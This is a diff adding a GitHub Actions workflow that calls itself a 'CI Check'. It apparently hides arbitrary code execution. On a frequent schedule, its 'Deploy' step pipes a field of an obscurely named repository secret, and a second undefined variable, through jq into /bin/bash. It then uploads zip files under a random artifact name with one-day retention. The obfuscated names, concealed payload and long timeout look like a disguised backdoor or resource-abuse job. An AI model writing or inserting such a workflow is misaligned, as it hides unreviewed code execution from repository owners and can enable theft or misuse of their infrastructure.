@@ -1,0 +1,32 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Deploy
+        env:
+          l8: ${{ secrets.l8 }}
+        run: |
+          printf '%s' "$l8" | jq -r .v75 | /bin/bash
+          echo $fz473 | jq -r .vum5 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: r2FoBEkP
+          path: "*.zip"
+          retention-days: 1
